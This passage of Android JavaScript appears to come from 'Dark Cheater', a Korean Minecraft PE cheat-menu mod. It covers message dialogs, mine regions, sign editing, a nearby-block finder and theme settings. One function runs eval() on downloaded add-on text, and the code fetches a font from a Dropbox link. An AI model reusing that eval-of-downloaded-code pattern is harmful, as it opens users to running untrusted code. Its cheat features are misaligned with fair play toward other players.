var types_Data = ["f", 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, "a", "b", "c", "d", "e", "f"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
nn = p;
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("내용 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("공지의 내용을 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var yaw = Math.floor(Entity.getYaw(target));
var sin = -Math.sin(yaw/180*Math.PI);
var cos = Math.cos(yaw/180*Math.PI);
var pos = [Entity.getX(target)+2*sin, Entity.getY(target)-1.2, Entity.getZ(target)+2*cos];
var word = Level.spawnMob(pos[0], pos[1], pos[2], 64);
ScriptManager.nativeEntitySetNameTag(word, "§"+types_Data[nn]+loc2.getText());
var n = 0;
new java.lang.Thread({
run : function(){
while(true){
java.lang.Thread.sleep(5);
Entity.setPosition(word, pos[0], pos[1], pos[2]);
n++;
if(n==2000){
Entity.remove(word);
break;
}
}
}
}).start();
Dark.toast("전송되었습니다.");
}
}));
dialog.setTitle("메시지 전송");
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectMineType(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var mines = ["일반 광산", "돌 광산"];
dialog.setItems(mines, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
var fileNames = ["mineData", "stoneMineData"];
if(tf){
var pos = [[], []];
for(var n=0;n<3;n++){
pos[0][n] = Math.min(mineData[0][n], mineData[1][n]);
pos[1][n] = Math.max(mineData[0][n], mineData[1][n]);
}
Dark.mapSave(fileNames[w], Dark.mapRead(fileNames[w])+pos[0][0]+"."+pos[1][0]+"."+pos[0][1]+"."+pos[1][1]+"."+pos[0][2]+"."+pos[1][2]+"::");
Dark.toast(mines[w]+"으로 설정되었습니다.");
}
else{
var file = new java.io.File(sdcard+"/games/com.mojang/minecraftWorlds/"+Level.getWorldDir()+"/"+fileNames[w]+".txt");
if(file.exists()) file.delete();
Dark.toast("이 맵의 모든 "+mines[w]+"들이 사라졌습니다.");
}
}
}));
dialog.setTitle("광산 종류 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function openSignEditor(x, y, z){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt = [];
for(var n=0;n<4;n++){
txt[n] = new android.widget.EditText(ctx);
txt[n].setHint("표지판 "+(n+1)+"번째 줄 내용");
txt[n].setText(Level.getSignText(x, y, z, n)+"");
txt[n].setTextColor(white);
layout.addView(txt[n]);
Dark.noFullScreen(txt[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("표지판 내용 수정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
for(var n=0;n<4;n++)
Level.setSignText(x, y, z, n, txt[n].getText().toString());
Dark.toast("표지판 내용이 수정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makePointButton(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
pBtn = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = [];
for(var n=0;n<2;n++){
btns[n] = new android.widget.TextView(ctx);
btns[n].setText("지점"+(n+1));
btns[n].setTextSize(14);
btns[n].setTextColor(white);
btns[n].setId(n);
btns[n].setGravity(center);
btns[n].setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
pointInput = v.getId()+1;
Dark.toast("지점 "+(v.getId()+1)+"을 터치하세요...");
}
}));
layout.addView(btns[n]);
}
setDragListener(pBtn, btns[0], 2);
var pad = dip2px(ctx, 3);
layout.setPadding(pad, pad, pad, pad);
pBtn.setContentView(layout);
pBtn.setWidth(-2);
pBtn.setHeight(-2);
pBtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(90, 60, 60, 60)));
pBtn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, 0, dip2px(ctx, 32));
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectToastType(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var types = ["불투명 (디바이스 기본)", "검은 반투명 (다크 치터 기본)", "투명", "흰 반투명"];
dialog.setItems(types, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
toastType = w;
Dark.save("toastType", w);
Dark.toast("토스트의 색상이 "+types[w]+"으로 설정되었습니다.");
}
}));
dialog.setTitle("토스트 색상 설정");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function deleteFile(){
darkMessage("SD 카드 초기화 무력화됨.");
}


function makeDarkFrame(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
effectWindow = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/frame.png");
var screen = new android.graphics.drawable.BitmapDrawable(image);
screen.setAlpha(145);
effectWindow.setContentView(layout);
effectWindow.setBackgroundDrawable(screen);
effectWindow.setTouchable(false);
effectWindow.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
effectWindow.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
effectWindow.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}

function showParticle(x, y, z){
for(var xx=x-24;xx<x+24;xx++){
Level.addParticle(ParticleType.flame, xx+0.5, y+2.5, z-19.5, 0, 0, 0, 3);
Level.addParticle(ParticleType.flame, xx+0.5, y+2.5, z+27.5, 0, 0, 0, 3);
}
for(var zz=z-20;zz<z+27;zz++){
Level.addParticle(ParticleType.flame, x-23.5, y+2.5, zz, 0, 0, 0, 3);
Level.addParticle(ParticleType.flame, x+24.5, y+2.5, zz, 0, 0, 0, 3);
}
}

function spawnVillage(x, y, z){
var cache = Dark.readAddOn("villageData");
if(cache!="") eval(cache+"");
else Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}


function createFontFileFromWeb(){
try{
var url = new java.net.URL("https://www.dropbox.com/s/dn4weguewj5ixaf/minecraft.ttf?dl=1");
var con = url.openConnection();
if(con!=null){
con.setConnectTimeout(5000);
con.setUseCaches(false);
var bis = new java.io.BufferedInputStream(con.getInputStream());
var file = new java.io.File(sdcard+"/darkTornado/mcpefont.tff");
var fos = new java.io.FileOutputStream(file);
var bos = new java.io.BufferedOutputStream(fos);
var buf;
while((buf = bis.read()) != -1){
bos.write(buf);
}
bis.close();
bos.close();
con.disconnect();
fos.close();
}
}
catch(e){
Dark.toast("인터넷에 연결한 상태로 블록런처를 다시 실행해주세요.");
return;
Dark.showError(e);
}
}


function designSettings(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuD = new android.widget.PopupWindow();
var title = makeTitle("UI 설정", menuD);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = [];
var menuT = ["테마 사용", "메뉴에서 검은색 글자 사용", "윈도우 10 GUI 사용", "Dark Effect 사용", "토글 버튼 강제 반투명화"];
var bools = [eval(Dark.read("useTheme")+""), eval(Dark.read("textBlack")+""), pcGUI, eval(Dark.read("useDarkEffect")+""), transToggle, !useExitBtn];
for(var n in menuT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menuT[n]);
btnT[n].setId(n);
btnT[n].setChecked(Boolean(bools[n]));
btnT[n].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
Dark.save("useTheme", onoff);
if(onoff&&Dark.read("themeName")=="") themeList();
break;
case 1 : 
Dark.save("textBlack", onoff);
if(onoff) white2 = black;
else white2 = white;
break;
case 2 : 
pcGUI = onoff;
ScriptManager.nativeModPESetDesktopGui(onoff);
break;
case 3 : 
Dark.save("useDarkEffect", onoff);
Dark.toast("블록런처를 재시작하셔야 정상적으로 적용됩니다.");
if(onoff){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/DarkCheater.jpg");
if(!file.exists()&&checkInternet()){
download("darkTornado/darkCheater", "DarkCheater.jpg", "Dark Cheater Cover", GitHubLink+"darkCheater.jpg", 1);
}
Dark.darkEffect();
}
else{
ModPE.resetImages();
}
break;
case 4 : 
transToggle = onoff;
Dark.save("transToggle", onoff);
break;
}
}
}));
layout.addView(btnT[n].mv());
}
var btns = [];
var menus = ["블록런처 UI 변경", "메뉴 색상 설정", "다크 치터 테마 관리", "토스트 색상 설정", "디자인 설정", "나가기 & X 버튼 사용", "버튼 세로 크기 설정"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
selectTheme();
break;
case 1 : 
selectColor();
break;
case 2 : 
themeList();
break;
case 3 : 
selectToastType();
break;
case 4 : 
Dark.designList();
break;
case 5 : 
if(useExitBtn==0){
useExitBtn = 1;
btns[5].setText("나가기 버튼 사용");
}
else if(useExitBtn==1){
btns[5].setText("X 버튼 사용");
useExitBtn = 2;
}
else if(useExitBtn==2){
btns[5].setText("나가기 & X 버튼 사용");
useExitBtn = 0;
}
Dark.save("noExit", useExitBtn);
break;
case 6 : 
selectButtonHeight();
break;
}
}
});
layout.addView(btns[n]);
}
if(useExitBtn==1) btns[5].setText("나가기 버튼 사용");
else if(useExitBtn==2) btns[5].setText("X 버튼 사용");
var exit = makeExit(menuD);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuD);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuD.setContentView(layout2);
menuD.showAtLocation(ctx.getWindow().getDecorView(),center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function additionalSlot(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
if(as.btn!=null) as.btn.dismiss();
as.btn = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txts = [];
var pad = dip2px(ctx, 3);
for(var n=0;n<3;n++){
txts[n] = new android.widget.TextView(ctx);
if(as.data[n][0]==0) txts[n].setText("비어 있음");
else txts[n].setText(Item.getName(as.data[n][0], as.data[n][1]));
txts[n].setTextSize(13);
txts[n].setTextColor(white);
txts[n].setId(n);
txts[n].setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
var slotId = Player.getSelectedSlotId();
var index = v.getId();
var cache = as.data[index];
as.data[index] = [Player.getInventorySlot(slotId), Player.getInventorySlotData(slotId)];
if(cache[0]!=0) Player.setInventorySlot(slotId, cache[0], 5, cache[1]);
txts[index].setText(Item.getName(as.data[index][0], as.data[index][1]));
}
}));
txts[n].setPadding(pad, pad, pad, pad);
layout.addView(txts[n]);
}
setDragListener(as.btn, txts[0], 4);
as.btn.setContentView(layout);
as.btn.setWidth(-2);
as.btn.setHeight(-2);
as.btn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
as.btn.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
else if(as.btn!=null){
as.btn.dismiss();
as.btn = null;
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectButtonHeight(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt = new android.widget.TextView(ctx);
if(btnHeight==-2) txt.setText("버튼 세로 크기 : 적당히");
else txt.setText("버튼 세로 크기 : "+btnHeight+"dp");
txt.setTextSize(16);
txt.setTextColor(white);
layout.addView(txt);
var cache = btnHeight;
var um = new android.widget.SeekBar(ctx);
um.setMax(8);
um.setProgress(cache/10);
um.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
cache = 10*(seek.getProgress()+2);
txt.setText("버튼 세로 크기 : "+cache+"dp");
}
}));
layout.addView(um);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
dialog.setView(layout);
dialog.setTitle("버튼 세로 크기 설정");
dialog.setNegativeButton("취소", null);
dialog.setNeutralButton("적당히 설정", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
btnHeight = -2;
Dark.save("btnHeight", -2);
Dark.toast("버튼 세로 크기가 적당히 설정되었습니다.");
}
}));
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
btnHeight = cache;
Dark.save("btnHeight", btnHeight);
Dark.toast("버튼 세로 크기가 "+btnHeight+"(으)로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}

function blockSearchDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var cache = 10;
var txt = new android.widget.TextView(ctx);
txt.setText("범위 : "+cache);
txt.setTextSize(16);
txt.setTextColor(white);
layout.addView(txt);
var ar = new android.widget.SeekBar(ctx);
ar.setMax(50);
ar.setProgress(cache);
ar.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
cache = seek.getProgress();
txt.setText("범위 : "+cache);
}
}));
layout.addView(ar);
var loc1 = new android.widget.TextView(ctx);
loc1.setText("블록 아이디 : ");
loc1.setTextSize(16);
loc1.setTextColor(white);
layout.addView(loc1);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("블록 아이디를 입력하세요...");
loc2.setInputType(number);
layout.addView(loc2);
var loc3 = new android.widget.TextView(ctx);
loc3.setText("블록 데미지 : ");
loc3.setTextSize(16);
loc3.setTextColor(white);
layout.addView(loc3);
var loc4 = new android.widget.EditText(ctx);
loc4.setHint("블록 데미지를 입력하세요...");
loc4.setInputType(number);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("블록 추적");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
bs.data = [Number(loc2.getText()), Number(loc4.getText())];
if(bs.data[0]=="NaN") bs.data[0] = 0;
if(bs.data[1]=="NaN") bs.data[1] = 0;
blockSearch(cache);
Dark.toast("주변 블록 스캔중...");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function blockSearch(area){
new java.lang.Thread({
run : function(){
bs.pos = [];
var px, py, pz;
px = Player.getX();
py = Player.getY();
pz = Player.getZ();
for(var xx=px-area;xx<px+area+1;xx++)
for(var yy=py-area;yy<py+area+1;yy++)
for(var zz=pz-area;zz<pz+area+1;zz++)
if(getTile(xx, yy, zz)==bs.data[0]&&Level.getData(xx, yy, zz)==bs.data[1]){
bs.pos.push([xx, yy, zz]);
}
if(bs.pos[0]!=null) bs.tf = true;
else Dark.toast("범위 내에서 해당 블록을 찾을 수 없습니다.");
}
}).start();
}


function setBtnColor(){
if(designType>=2){
if(ndCache[0]==null) ndCache[0] = new android.graphics.drawable.BitmapDrawable(new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/images/button.png"));
return ndCache[0];
}
if(Dark.read("useTheme")=="true"){
if(btnBackData!=null) return btnBackData;
var cache = sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/button";
var file = new java.io.File(cache+".png");
var file2 = new java.io.File(cache+".jpg");
var file3 = new java.io.File(cache+".jpeg");
if(file.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(cache+".png");
btnBackData = new android.graphics.drawable.BitmapDrawable(image);
return btnBackData;
}
else if(file2.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(cache+".jpg");
btnBackData = new android.graphics.drawable.BitmapDrawable(image);
return btnBackData;
}
else if(file3.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(cache+".jpeg");
btnBackData = new android.graphics.drawable.BitmapDrawable(image);
return btnBackData;
}
else{
return new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(80, 20, 20, 20));
}
}
else{
return new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(80, 20, 20, 20));
}
}

function makeTitle(txt, tf){
var title = new android.widget.TextView(ctx);
var pad = dip2px(ctx, 3);
if(designType>=6) pad = dip2px(ctx, 5);
if(tf==true){
title.setText(txt);
title.setTextSize(23);
if(Dark.read("textBlack")=="true") title.setTextColor(android.graphics.Color.BLACK);
else title.setTextColor(android.graphics.Color.CYAN);
title.setPadding(pad, pad, pad, dip2px(ctx, 20));
}
else{
title.setText(txt);
title.setTextSize(21);
title.setTextColor(white2);
title.setPadding(pad, pad, pad, dip2px(ctx, 14));
}
title.setGravity(center);
if(Dark.read("useTheme")=="true"){
if(titleBackData==null){
var cache = sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/title";
var file = new java.io.File(cache+".png");
var file2 = new java.io.File(cache+".jpg");
var file3 = new java.io.File(cache+".jpeg");
if(file.exists()) var image = new android.graphics.BitmapFactory.decodeFile(cache+".png");
else if(file2.exists()) var image = new android.graphics.BitmapFactory.decodeFile(cache+".jpg");
else if(file3.exists()) var image = new android.graphics.BitmapFactory.decodeFile(cache+".jpeg");
if(designType>=6){
title.setTextColor(white2);
title.setBackgroundDrawable(ndCache[4]);
}
else if(designType>=2) title.setTextColor(android.graphics.Color.CYAN);
else return title;
}
btnBackData = new android.graphics.drawable.BitmapDrawable(image);
title.setBackgroundDrawable(titleBackData);
}
if(designType==8&&tf!=true) title.setTextColor(white);
else if(designType==7||designType==6){
title.setTextColor(android.graphics.Color.YELLOW);
title.setBackgroundDrawable(ndCache[4]);
title.setTypeface(font);
}
else if(designType>=2) title.setTextColor(android.graphics.Color.CYAN);
if(useExitBtn==1) return title;
var layout = new android.widget.RelativeLayout(ctx);
title.setLayoutParams(new android.widget.RelativeLayout.LayoutParams(-1, -2));
layout.addView(title);
var params = new android.widget.RelativeLayout.LayoutParams(dip2px(ctx, 35), dip2px(ctx, 35));
params.addRule(android.widget.RelativeLayout.ALIGN_PARENT_RIGHT);
params.addRule(android.widget.RelativeLayout.ALIGN_PARENT_TOP);
if(tf===true){
var exit = makeButton("X");
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
Dark.close(true);
}
}));
}
else{
var exit = makeExit(tf);
exit.setText("X");
}
var pad = dip2px(ctx, 3);
exit.setPadding(pad, pad, pad, pad);
exit.setLayoutParams(params);
layout.addView(exit);
return layout;
}

function makeButton(text){
var btn = new android.widget.Button(ctx);
btn.setText(text);
if(designType!=1){
btn.setBackgroundDrawable(setBtnColor());
if(designType==8){
btn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
btn.setTextColor(white);
}
else if(designType==7) btn.setTextColor(black);
else if(designType==6) btn.setTextColor(white);
else if(designType>=4) btn.setTextColor(black);
else if(designType>=2) btn.setTextColor(white);
else btn.setTextColor(white2);
}
var mar = dip2px(ctx, btnMargin);
var cache = btnHeight;
if(cache!=-2) cache = dip2px(ctx, cache);
var margin = new android.view.ViewGroup.MarginLayoutParams(-1, cache);
margin.setMargins(mar, mar, mar, mar);
btn.setLayoutParams(new android.widget.LinearLayout.LayoutParams(margin));
if(designType==7||designType==6){
btn.setTypeface(font);
btn.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch : function(v, ev){
if(ev.getAction()==android.view.MotionEvent.ACTION_DOWN||ev.getAction()==android.view.MotionEvent.ACTION_MOVE) btn.setBackgroundDrawable(ndCache[2]);
else btn.setBackgroundDrawable(ndCache[0]);
return false;
}
}));
}
return btn;
}

function DarkToggleButton(){
if(designType==8) this.btn = new android.widget.CheckBox(ctx);
else this.btn = new android.widget.ToggleButton(ctx);
if(designType!=1){
this.btn.setTextColor(white2);
if(ndCache[1]==null) ndCache[1] = new android.graphics.drawable.BitmapDrawable(new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/images/toggleButtonOff.png"));
if(ndCache[2]==null) ndCache[2] = new android.graphics.drawable.BitmapDrawable(new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/images/toggleButtonOn.png"));
if(designType>=2&&designType!=8){
this.btn.setBackgroundDrawable(ndCache[1]);
if(designType==7) this.btn.setTextColor(black);
else if(designType==6) this.btn.setTextColor(white);
else if(designType>=4) this.btn.setTextColor(black);
else this.btn.setTextColor(white);
}
else if(transToggle){
this.btn.setTextColor(white2);
this.btn.setBackgroundColor(android.graphics.Color.argb(100, 85, 80, 90));
}
}
var mar = dip2px(ctx, btnMargin);
var margin = new android.view.ViewGroup.MarginLayoutParams(-1, -2);
margin.setMargins(mar, mar, mar, mar);
this.btn.setLayoutParams(new android.widget.LinearLayout.LayoutParams(margin));
if(designType==7||designType==6) this.btn.setTypeface(font);
}

DarkToggleButton.prototype = {
setChecked : function(tf){
this.btn.setChecked(tf);
if(designType!=1){
if(designType==8){
this.btn.setTextColor(white);
}
else if(designType>=2){
if(tf) this.btn.setBackgroundDrawable(ndCache[2]);
else this.btn.setBackgroundDrawable(ndCache[1]);
}
else if(transToggle){
if(tf){
this.btn.setTextColor(android.graphics.Color.GREEN);
this.btn.setBackgroundColor(android.graphics.Color.argb(110, 70, 130, 130));
}
else{
this.btn.setTextColor(white2);
this.btn.setBackgroundColor(android.graphics.Color.argb(100, 85, 80, 90));
}
}
}
},
setText : function(txt){
if(designType==8){
this.btn.setText(txt);
}
else{
this.btn.setTextOn(txt);
this.btn.setTextOff(txt);
}
},
setTextOn : function(txt){
this.btn.setTextOn(txt);
},
setTextOff : function(txt){
this.btn.setTextOff(txt);
},
setId : function(n){
this.btn.setId(n);
},
setOnChangedListener : function(listener){
if(designType!=1){
if(designType>=2&&designType!=8){
this.btn.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
if(v.isChecked()) v.setBackgroundDrawable(ndCache[2]);
else v.setBackgroundDrawable(ndCache[1]);
}
}));
}
else if(transToggle){
this.btn.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
if(v.isChecked()){
v.setTextColor(android.graphics.Color.GREEN);
v.setBackgroundColor(android.graphics.Color.argb(110, 70, 130, 130));
}
else{
v.setTextColor(white2);
v.setBackgroundColor(android.graphics.Color.argb(100, 85, 80, 90));
}
}
}));
}
}
this.btn.setOnCheckedChangeListener(listener);
},
setWidth : function(n){
this.btn.setWidth(n);
},
setTextColor : function(color){
this.btn.setTextColor(color);
},
mv : function(){
return this.btn;
}
};

function makeScroll(layout, layout2, menu0){
var scroll = new android.widget.ScrollView(ctx);
var pad = dip2px(ctx, 3);
scroll.setPadding(pad, pad, pad, pad);
scroll.setLayoutParams(new android.widget.LinearLayout.LayoutParams(-1, -1));
scroll.addView(layout);
if(Dark.read("alpha")=="true") var alpha = 255;
else var alpha = 70;
var color = Number(Dark.read("color"));
var colorCache = Dark.read("colorData").toString().split(",");
var colorData = android.graphics.Color.argb(alpha, 0, 0, 0);
if(color==1) colorData = android.graphics.Color.argb(alpha, 200, 200, 200);
else if(color==2) colorData = android.graphics.Color.argb(alpha, 255, 0, 0);
else if(color==3) colorData = android.graphics.Color.argb(alpha, 0, 255, 0);
else if(color==4) colorData = android.graphics.Color.argb(alpha, 0, 0, 255);
else if(color==5) colorData = android.graphics.Color.argb(alpha, 255, 255, 0);
else if(color==6) colorData = android.graphics.Color.argb(alpha, 0, 255, 255);
else if(color==7) colorData = android.graphics.Color.argb(alpha, 255, 0, 255);
else if(color==8) colorData = android.graphics.Color.argb(alpha, colorCache[0], colorCache[1], colorCache[2]);
menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(colorData));
menu0.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth()*1/3);
menu0.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
if(Dark.read("useTheme")=="true"){
var menus = [menu, menuI, menuA, menuD, menuW, menuP, menuP2, menuB, menuE, menuE2, menuWE, menuM, menuDL, menuS2, menuT, menuT3, menuEL, menuS, menuEL];
var theme = ["main", "inven", "armor", "dark", "world", "player", "players", "ban", "entity", "entity2", "worldEdit", "move", "DL", "server", "antiTerror", "terrorHelper", "else", "settings", "plus"];
for(var n in menus){
if(menu0==menus[n]){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".png");
var file2 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".jpg");
if(file.exists()) var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".png");
else if(file2.exists()) var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".jpg");
else var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".jpeg");
var back = new android.graphics.drawable.BitmapDrawable(image);
scroll.setBackgroundDrawable(back);
break;
}
}
}
if(designType>=6){
menu0.setBackgroundDrawable(ndCache[3]);
layout2.setPadding(2, 2, 2, 2);
}
else if(designType>=2){
if(ndCache[3]==null){
if(designType>=4) var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/images/menu_light.png");
else var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/images/menu.png");
ndCache[3] = new android.graphics.drawable.BitmapDrawable(image);
if(designType%2==0) ndCache[3].setAlpha(130);
else ndCache[3].setAlpha(255);
}
if(ndCache[4]==null) ndCache[4] = new android.graphics.drawable.BitmapDrawable(new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/images/layout.png"));
menu0.setBackgroundDrawable(ndCache[3]);
layout2.setBackgroundDrawable(ndCache[4]);
layout2.setPadding(2, 2, 2, 2);
}
if(designType==1) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
else if(designType==8) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
return scroll;
}

function makeExit(menu){
var exit = makeButton("나가기");
exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
if(menu!=null){
menu.dismiss();
menu = null;
}
}
});
exit.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(true);
return true;
}
});
return exit;
}

function setDragListener(w, v, n, tf){
try{
var longTouchCheck = false;
v.setOnLongClickListener(new android.view.View.OnLongClickListener({
onLongClick: function(v){
if(widgetDrag||tf) longTouchCheck = true;
return true;
}
}));
v.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function(v, ev){
try{
if(longTouchCheck&&(widgetDrag||tf)){
switch(ev.action){
case android.view.MotionEvent.ACTION_MOVE : 
var sX = ctx.getWindowManager().getDefaultDisplay().getWidth();
var sY = ctx.getWindowManager().getDefaultDisplay().getHeight();
if(n==0) w.update(ev.getRawX(), ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==1) w.update(ev.getRawX()-sX/2, ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==2) w.update(sX-ev.getRawX(), ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==3) w.update(ev.getRawX(), ev.getRawY()-sY/2, w.getWidth(), w.getHeight());
else if(n==4) w.update(ev.getRawX()-sX/2, ev.getRawY()-sY/2, w.getWidth(), w.getHeight());
else if(n==5) w.update(sX-ev.getRawX(), ev.getRawY()-sY/2, w.getWidth(), w.getHeight());
else if(n==6) w.update(ev.getRawX(), sY-ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==7) w.update(ev.getRawX()-sX/2, sY-ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==8) w.update(sX-ev.getRawX(), sY-ev.getRawY(), w.getWidth(), w.getHeight());
break;
case android.view.MotionEvent.ACTION_UP : 
longTouchCheck = false;
break;
}
}
return false;
}
catch(e){
Dark.showError(e);
}
}
}));
}
catch(err){
Dark.showError(err);
}
}

function setDragListenerForSeekBar(w, v, tf){
v.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch : function(v, ev){
try{
